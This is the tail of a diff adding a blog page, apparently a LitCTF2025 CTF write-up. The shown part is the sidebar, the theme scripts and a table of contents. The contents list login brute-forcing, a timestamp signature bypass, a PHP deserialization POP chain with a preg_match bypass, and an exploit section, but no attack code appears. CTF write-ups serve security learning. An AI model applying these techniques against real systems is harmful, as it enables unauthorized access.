+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text"> Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ez_signin%E7%88%86%E7%A0%B4%E6%97%B6%E9%97%B4%E6%88%B3"><span class="toc-number">1.1.</span> <span class="toc-text"> ez_signin(爆破时间戳)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%9B%E3%81%AE%E5%90%8D%E3%81%AFwp"><span class="toc-number">1.2.</span> <span class="toc-text"> 君の名はwp</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0pop%E9%93%BE"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 构造pop链</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87preg_matchoadi-litctf2025"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 绕过preg_match(&quot;&#x2F;^[Oa]:[\d]+&#x2F;i&quot;, $Litctf2025)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4exp"><span class="toc-number">1.2.3.</span> <span class="toc-text"> 完整EXP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="toc-number">1.2.4.</span> <span class="toc-text"> 非预期</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto"><span class="toc-number">2.</span> <span class="toc-text"> Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#math"><span class="toc-number">2.1.</span> <span class="toc-text"> math</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby"><span class="toc-number">2.2.</span> <span class="toc-text"> baby</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "LitCTF2025-WriteUp",
+          url: "http://example.com/2025/05/26/LitCTF2025-WriteUp/",
+          excerpt: "",
+          description: "",
+          stripContent: " Web  ez_signin(爆破时间戳)  一进去是403 扫目录扫出来/login.html，访问  一个文档管理系统 先来爆破一下这个登录系统 抓包，爆破username和password 爆破出来用户名和密码为admin/admin123 但当登录的时候显示签名错误 来看JS源代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556",
+          date: "Mon May 26 2025 14:17:19 GMT+0800",
+          updated: "Fri Oct 03 2025 15:07:41 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
